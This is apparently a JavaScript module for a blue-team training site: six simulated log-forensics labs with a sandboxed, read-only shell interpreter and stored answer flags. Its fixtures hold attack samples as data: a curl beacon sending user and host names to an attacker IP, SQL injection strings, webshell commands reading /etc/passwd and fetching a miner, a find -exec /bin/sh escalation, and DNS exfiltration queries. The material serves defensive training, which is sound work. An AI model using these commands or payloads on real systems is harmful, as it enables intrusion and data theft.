/**
 * Interactive Labs - simulated Linux terminal for hands-on Blue Team work.
 *
 * Each lab ships a virtual filesystem (VFS). Users type real shell-style
 * commands which are interpreted safely in JS (NO real shell, NO real FS).
 * They investigate logs with grep/cat/cut/sort/etc. to discover a flag.
 *
 * Security: the interpreter only supports a whitelisted set of read-only
 * commands operating on the in-memory VFS. Nothing touches the host.
 */

// ---------------------------------------------------------------------------
// Lab 1: Web log intrusion — find the attacker in access.log
// ---------------------------------------------------------------------------
const ACCESS_LOG = `10.0.0.15 - - [18/Mar/2024:08:12:01] "GET /index.html HTTP/1.1" 200 1043
10.0.0.15 - - [18/Mar/2024:08:12:04] "GET /style.css HTTP/1.1" 200 512
203.0.113.66 - - [18/Mar/2024:08:14:22] "GET /admin HTTP/1.1" 401 173
203.0.113.66 - - [18/Mar/2024:08:14:23] "GET /admin HTTP/1.1" 401 173
203.0.113.66 - - [18/Mar/2024:08:14:25] "GET /../../etc/passwd HTTP/1.1" 400 0
203.0.113.66 - - [18/Mar/2024:08:14:31] "GET /admin?id=1' OR '1'='1 HTTP/1.1" 500 0
203.0.113.66 - - [18/Mar/2024:08:15:02] "POST /login HTTP/1.1" 401 173
203.0.113.66 - - [18/Mar/2024:08:15:03] "POST /login HTTP/1.1" 401 173
203.0.113.66 - - [18/Mar/2024:08:15:04] "POST /login HTTP/1.1" 401 173
203.0.113.66 - - [18/Mar/2024:08:15:05] "POST /login HTTP/1.1" 200 891
203.0.113.66 - - [18/Mar/2024:08:15:44] "GET /admin/users.php HTTP/1.1" 200 4213
203.0.113.66 - - [18/Mar/2024:08:16:20] "GET /admin/export.php?f=cards.csv HTTP/1.1" 200 88213
198.51.100.9 - - [18/Mar/2024:08:20:10] "GET /index.html HTTP/1.1" 200 1043
10.0.0.22 - - [18/Mar/2024:08:22:33] "GET /products HTTP/1.1" 200 2201`;

const NOTES_TXT = `SOC Handover Notes
------------------
- Alert fired on WEB01 for repeated 401s.
- Baseline internal subnet is 10.0.0.0/24 (trusted).
- Anything from public IPs hitting /admin is suspicious.
- When you identify the attacker IP, the flag format is:  BTLAB{attacker_ip}
  e.g. BTLAB{1.2.3.4}`;

const lab1 = {
  slug: 'web-log-intrusion',
  title: 'Terminal: Web Log Intrusion',
  description: 'SSH-style investigation. Use the terminal to grep through a web access log, find the attacker who breached /admin, and submit the flag.',
  difficulty: 'easy',
  category: 'blue',
  tags: ['Log Analysis', 'grep', 'Linux CLI', 'Web'],
  icon: 'Terminal',
  points: 50,
  flag: 'BTLAB{203.0.113.66}',
  objectives: [
    'List the files in the current directory (ls)',
    'Read the handover notes (cat notes.txt)',
    'Find the IP with many failed logins then a success (grep /login access.log)',
    'Submit the flag: BTLAB{attacker_ip}',
  ],
  welcome: 'Investigate the intrusion. Type `help` for available commands, `ls` to start.',
  fs: {
    'notes.txt': NOTES_TXT,
    'access.log': ACCESS_LOG,
    'README': 'Files:\n  notes.txt   - SOC handover notes (start here)\n  access.log  - Apache access log to analyze',
  },
};

// ---------------------------------------------------------------------------
// Lab 2: Linux persistence hunt — find the malicious cron entry
// ---------------------------------------------------------------------------
const AUTH_LOG = `Mar 18 02:03:11 srv sshd[2211]: Failed password for root from 45.9.148.3 port 55021
Mar 18 02:03:14 srv sshd[2211]: Failed password for root from 45.9.148.3 port 55022
Mar 18 02:03:19 srv sshd[2213]: Accepted password for root from 45.9.148.3 port 55040
Mar 18 02:04:02 srv sudo:    root : COMMAND=/usr/bin/crontab -e
Mar 18 02:05:10 srv CRON[2299]: (root) CMD (/tmp/.hidden/beacon.sh)`;

const CRONTAB = `# m h dom mon dow command
0 2 * * * /usr/bin/certbot renew --quiet
*/5 * * * * /tmp/.hidden/beacon.sh
30 3 * * 0 /usr/local/bin/backup.sh`;

const BEACON = `#!/bin/sh
# beaconing implant
while true; do
  curl -s http://45.9.148.3/gate -d "$(whoami)@$(hostname)"
  sleep 300
done`;

const lab2 = {
  slug: 'linux-persistence-hunt',
  title: 'Terminal: Linux Persistence Hunt',
  description: 'A Linux server was compromised. Use the terminal to inspect auth logs and cron to find the persistence mechanism the attacker planted.',
  difficulty: 'medium',
  category: 'blue',
  tags: ['Linux', 'Persistence', 'cron', 'IR', 'grep'],
  icon: 'Terminal',
  points: 60,
  flag: 'BTLAB{/tmp/.hidden/beacon.sh}',
  objectives: [
    'Read the auth log (cat auth.log) — how did they get in?',
    'Inspect the crontab (cat crontab) for a suspicious entry',
    'Identify the full path of the malicious script run by cron',
    'Submit the flag: BTLAB{full_path_of_script}',
  ],
  welcome: 'Root was compromised. Find how the attacker persists. Type `help`, then `ls`.',
  fs: {
    'auth.log': AUTH_LOG,
    'crontab': CRONTAB,
    'README': 'Files:\n  auth.log  - SSH/sudo auth log\n  crontab   - root user crontab dump\n\nHint: the attacker edited crontab (see auth.log) to run a script.',
    '.beacon_hint': 'Nice — you found a hidden file! The real implant lives at /tmp/.hidden/beacon.sh',
  },
};

// ---------------------------------------------------------------------------
// Lab 3: Web Attack Forensics — find the SQLi + webshell in Apache logs
// ---------------------------------------------------------------------------
const WEB_ATTACK_LOG = `45.155.205.8 - - [20/Mar/2024:11:02:01] "GET /products?id=1 HTTP/1.1" 200 3201
45.155.205.8 - - [20/Mar/2024:11:02:14] "GET /products?id=1' HTTP/1.1" 500 512
45.155.205.8 - - [20/Mar/2024:11:02:20] "GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 200 8842
45.155.205.8 - - [20/Mar/2024:11:03:05] "GET /products?id=1 AND SLEEP(5)-- HTTP/1.1" 200 3201
45.155.205.8 - - [20/Mar/2024:11:05:41] "POST /upload.php HTTP/1.1" 200 91
45.155.205.8 - - [20/Mar/2024:11:06:02] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 44
45.155.205.8 - - [20/Mar/2024:11:06:33] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1802
45.155.205.8 - - [20/Mar/2024:11:08:10] "GET /uploads/shell.php?cmd=wget+http://45.155.205.8/miner HTTP/1.1" 200 12
10.0.0.30 - - [20/Mar/2024:11:15:00] "GET /products?id=5 HTTP/1.1" 200 3190`;

const lab3 = {
  slug: 'web-attack-forensics',
  title: 'Terminal: Web Attack Forensics',
  description: 'A web app was breached. Use the terminal to trace an SQL injection, locate the uploaded webshell, and determine what the attacker ran.',
  difficulty: 'medium',
  category: 'blue',
  tags: ['Web', 'SQLi', 'Webshell', 'Log Analysis', 'grep'],
  icon: 'Terminal',
  points: 65,
  flag: 'BTLAB{shell.php}',
  objectives: [
    'Find the SQL injection attempts (grep for UNION or SLEEP)',
    'Identify the uploaded webshell filename (grep upload / .php)',
    'See what commands the attacker executed via the shell (?cmd=)',
    'Submit the flag: BTLAB{webshell_filename}',
  ],
  welcome: 'A public web server was compromised. Investigate access.log. Type `help`, then `ls`.',
  fs: {
    'access.log': WEB_ATTACK_LOG,
    'README': 'Files:\n  access.log - Apache access log\n\nAttacker IP is external (not 10.0.0.0/24).\nWatch for SQLi payloads (UNION SELECT, SLEEP) and a POST that uploads a file.',
  },
};

// ---------------------------------------------------------------------------
// Lab 4: Privilege Escalation Review — spot the SUID/sudo abuse
// ---------------------------------------------------------------------------
const SUDO_LOG = `Mar 21 09:10:22 host sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt update
Mar 21 09:32:41 host sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/find /var/log -name *.log
Mar 21 09:33:02 host sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh ; -quit
Mar 21 09:33:05 host su: (to root) deploy on pts/0
Mar 21 09:34:10 host sudo:  deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow`;

const SUID_LIST = `# find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/find
/usr/bin/newgrp
/tmp/backup/bash`;

const lab4 = {
  slug: 'privilege-escalation-review',
  title: 'Terminal: Privilege Escalation Review',
  description: 'User "deploy" got root. Use the terminal to review sudo logs and SUID binaries to find how the low-priv user escalated.',
  difficulty: 'medium',
  category: 'blue',
  tags: ['Linux', 'PrivEsc', 'SUID', 'sudo', 'GTFOBins'],
  icon: 'Terminal',
  points: 70,
  flag: 'BTLAB{find}',
  objectives: [
    'Review the sudo log (cat sudo.log) for suspicious commands',
    'List SUID binaries (cat suid.txt) — one legit binary is being abused',
    'Identify the binary used to spawn a root shell (hint: GTFOBins, -exec /bin/sh)',
    'Submit the flag: BTLAB{binary_name}',
  ],
  welcome: 'User "deploy" escalated to root. Find the technique. Type `help`, then `ls`.',
  fs: {
    'sudo.log': SUDO_LOG,
    'suid.txt': SUID_LIST,
    'README': 'Files:\n  sudo.log  - sudo/su activity for user deploy\n  suid.txt  - SUID binaries on the host\n\nOne allowed sudo command can spawn a shell (GTFOBins). Look at what runs right before "su (to root)".',
  },
};

// ---------------------------------------------------------------------------
// Lab 5: Threat Hunting — DNS exfiltration in query logs
// ---------------------------------------------------------------------------
const DNS_QUERY_LOG = `10.0.0.41  A   www.microsoft.com
10.0.0.41  A   update.windows.com
10.0.0.55  A   ZjZlYzc.exfil.attacker-dns.com
10.0.0.55  A   4d2e1f8a9.exfil.attacker-dns.com
10.0.0.55  A   b7c3d90e2.exfil.attacker-dns.com
10.0.0.55  A   1a2b3c4d5.exfil.attacker-dns.com
10.0.0.55  A   9f8e7d6c5.exfil.attacker-dns.com
10.0.0.55  A   deadbeef01.exfil.attacker-dns.com
10.0.0.55  A   cafe12345.exfil.attacker-dns.com
10.0.0.41  A   www.google.com
10.0.0.55  A   0011223344.exfil.attacker-dns.com`;

const lab5 = {
  slug: 'threat-hunting-dns-exfil',
  title: 'Terminal: Threat Hunt — DNS Exfiltration',
  description: 'Proactively hunt a compromised host. Use the terminal to spot DNS tunneling / data exfiltration hidden in query logs.',
  difficulty: 'medium',
  category: 'blue',
  tags: ['Threat Hunting', 'DNS', 'Exfiltration', 'grep', 'sort'],
  icon: 'Terminal',
  points: 70,
  flag: 'BTLAB{exfil.attacker-dns.com}',
  objectives: [
    'Count DNS queries per host to find the noisy one (cut + sort + uniq -c)',
    'Inspect the suspicious host\'s queries — long random subdomains = tunneling',
    'Identify the attacker domain used for exfiltration',
    'Submit the flag: BTLAB{exfil_domain}',
  ],
  welcome: 'Hunt for data exfiltration in the DNS logs. Type `help`, then `ls`.',
  fs: {
    'dns_queries.log': DNS_QUERY_LOG,
    'README': 'Files:\n  dns_queries.log - "src_ip  type  query"\n\nDNS tunneling shows as MANY queries from one host with long random subdomains to the same parent domain.\nTry:  cut -d " " -f 1 dns_queries.log | sort | uniq -c',
  },
};

// ---------------------------------------------------------------------------
// Lab 6: Windows Event Log Triage — RDP lateral movement
// ---------------------------------------------------------------------------
const WIN_EVENT_LOG = `EventID  Time              Account     LogonType  SourceIP        Host
4625     10:01:11          admin       10(RDP)    91.240.118.5    FIN-PC01
4625     10:01:19          admin       10(RDP)    91.240.118.5    FIN-PC01
4625     10:01:27          administrator 10(RDP)  91.240.118.5    FIN-PC01
4624     10:02:03          jbrown      10(RDP)    91.240.118.5    FIN-PC01
4672     10:02:03          jbrown      -          91.240.118.5    FIN-PC01
4624     10:07:44          jbrown      3(Network) -               FIN-PC02
4624     10:09:12          jbrown      3(Network) -               FIN-DC01
4688     10:11:05          jbrown      -          -               FIN-DC01   ntdsutil.exe`;

const lab6 = {
  slug: 'windows-rdp-lateral-movement',
  title: 'Terminal: Windows RDP Lateral Movement',
  description: 'An external IP brute-forced RDP then moved laterally to the domain controller. Triage the Windows event log to trace the attack.',
  difficulty: 'hard',
  category: 'blue',
  tags: ['Windows', 'RDP', 'Lateral Movement', 'Event Logs', 'DFIR'],
  icon: 'Terminal',
  points: 80,
  flag: 'BTLAB{jbrown}',
  objectives: [
    'Find the RDP brute force (grep 4625, LogonType 10)',
    'Identify which account was successfully compromised (4624 after the 4625s)',
    'Trace lateral movement to FIN-DC01 (grep the account across hosts)',
    'Submit the flag: BTLAB{compromised_account}',
  ],
  welcome: 'External RDP brute force led to DC compromise. Trace it. Type `help`, then `ls`.',
  fs: {
    'events.log': WIN_EVENT_LOG,
    'README': 'Files:\n  events.log - Windows Security events\n\nEvent IDs: 4625=fail, 4624=success, 4672=admin logon, 4688=process.\nLogonType 10=RDP, 3=Network. Find the account that failed then succeeded via RDP, then appears on other hosts.',
  },
};

const labs = [lab1, lab2, lab3, lab4, lab5, lab6];
labs.forEach((l, i) => { l.id = i + 1; });

// ---------------------------------------------------------------------------
// Safe command interpreter over the VFS
// ---------------------------------------------------------------------------

/** Split a command line into pipeline stages, each into argv tokens. */
function tokenize(line) {
  return line.split('|').map((seg) =>
    seg.trim().match(/(?:[^\s"]+|"[^"]*")+/g)?.map((t) => t.replace(/"/g, '')) || []
  );
}

function listFiles(fs, showHidden) {
  return Object.keys(fs)
    .filter((name) => showHidden || !name.startsWith('.'))
    .sort();
}

/** Apply a single command stage to stdin (string), return stdout (string). */
function runStage(argv, stdin, fs) {
  const cmd = argv[0];
  const args = argv.slice(1);
  const flags = args.filter((a) => a.startsWith('-'));
  const operands = args.filter((a) => !a.startsWith('-'));

  switch (cmd) {
    case 'help':
      return [
        'Available commands (read-only sandbox):',
        '  ls [-a]            list files',
        '  pwd                print working directory',
        '  cat <file>         print file contents',
        '  head [-n N] <f>    first N lines (default 10)',
        '  tail [-n N] <f>    last N lines (default 10)',
        '  grep [-i] <pat> <f>  search lines (or read from pipe)',
        '  wc [-l]            count lines/words',
        '  cut -d X -f N      split each line by X, take field N',
        '  sort [-u]          sort lines',
        '  uniq [-c]          collapse duplicate adjacent lines',
        '  clear              clear the screen',
        '  help               this message',
        '',
        'Pipes work:  grep 401 access.log | wc -l',
      ].join('\n');

    case 'pwd':
      return '/home/analyst/case';

    case 'ls':
      return listFiles(fs, flags.includes('-a')).join('  ');

    case 'cat': {
      if (!operands.length) return 'cat: missing file operand';
      return operands.map((f) =>
        f in fs ? fs[f] : `cat: ${f}: No such file or directory`
      ).join('\n');
    }

    case 'head':
    case 'tail': {
      let n = 10;
      const ni = args.findIndex((a) => a === '-n');
      let nValue = null;
      if (ni >= 0 && args[ni + 1]) {
        nValue = args[ni + 1];
        n = parseInt(nValue) || 10;
      }
      // File operands must exclude the numeric value that belongs to -n.
      const fileOperands = operands.filter((o) => o !== nValue);
      const src = fileOperands.length ? (fs[fileOperands[0]] ?? '') : stdin;
      const lines = src.split('\n');
      return (cmd === 'head' ? lines.slice(0, n) : lines.slice(-n)).join('\n');
    }

    case 'grep': {
      const ci = flags.includes('-i');
      // pattern is first non-flag operand; file is second (optional -> use stdin)
      const pattern = operands[0] ?? '';
      const src = operands[1] != null ? (fs[operands[1]] ?? '') : stdin;
      if (!pattern) return 'grep: missing pattern';
      const re = new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), ci ? 'i' : '');
      return src.split('\n').filter((l) => re.test(l)).join('\n');
    }

    case 'wc': {
      const src = operands.length ? (fs[operands[0]] ?? '') : stdin;
      const lines = src === '' ? 0 : src.split('\n').length;
      if (flags.includes('-l')) return String(lines);
      const words = src.trim() === '' ? 0 : src.trim().split(/\s+/).length;
      return `${lines} ${words} ${src.length}`;
    }

    case 'cut': {
      const di = args.findIndex((a) => a === '-d');
      const fi = args.findIndex((a) => a === '-f');
      const delim = di >= 0 ? (args[di + 1] || ' ') : ' ';
      const field = fi >= 0 ? parseInt(args[fi + 1]) : 1;
      const src = operands.length ? (fs[operands[operands.length - 1]] ?? '') : stdin;
      return src.split('\n').map((l) => {
        const parts = l.split(delim);
        return parts[field - 1] ?? '';
      }).join('\n');
    }

    case 'sort': {
      const src = operands.length ? (fs[operands[0]] ?? '') : stdin;
      let lines = src.split('\n').sort();
      if (flags.includes('-u')) lines = [...new Set(lines)];
      return lines.join('\n');
    }

    case 'uniq': {
      const src = operands.length ? (fs[operands[0]] ?? '') : stdin;
      const lines = src.split('\n');
      const out = [];
      let prev = null; let count = 0;
      for (const l of lines) {
        if (l === prev) { count++; }
        else {
          if (prev !== null) out.push(flags.includes('-c') ? `${count} ${prev}` : prev);
          prev = l; count = 1;
        }
      }
      if (prev !== null) out.push(flags.includes('-c') ? `${count} ${prev}` : prev);
      return out.join('\n');
    }

    case 'clear':
      return '\x00CLEAR\x00';

    case '':
      return '';

    default:
      return `${cmd}: command not found (type 'help')`;
  }
}

/** Execute a full command line (with pipes) against a lab's VFS. */
function execCommand(lab, line) {
  const trimmed = (line || '').trim();
  if (!trimmed) return '';
  const stages = tokenize(trimmed);
  let stdin = '';
  for (const argv of stages) {
    if (!argv.length) continue;
    stdin = runStage(argv, stdin, lab.fs);
  }
  return stdin;
}

function getLabById(id) {
  return labs.find((l) => String(l.id) === String(id) || l.slug === String(id));
}

/** Public view — never leak the flag. */
function toPublic(lab) {
  return {
    id: lab.id,
    slug: lab.slug,
    title: lab.title,
    description: lab.description,
    difficulty: lab.difficulty,
    category: lab.category,
    tags: lab.tags,
    icon: lab.icon,
    points: lab.points,
    objectives: lab.objectives,
    welcome: lab.welcome,
    flagFormat: lab.flag.replace(/\{.*\}/, '{...}'),
  };
}

function toSummary(lab) {
  return {
    id: lab.id,
    slug: lab.slug,
    title: lab.title,
    description: lab.description,
    difficulty: lab.difficulty,
    category: lab.category,
    tags: lab.tags,
    icon: lab.icon,
    points: lab.points,
  };
}

module.exports = { labs, getLabById, execCommand, toPublic, toSummary };
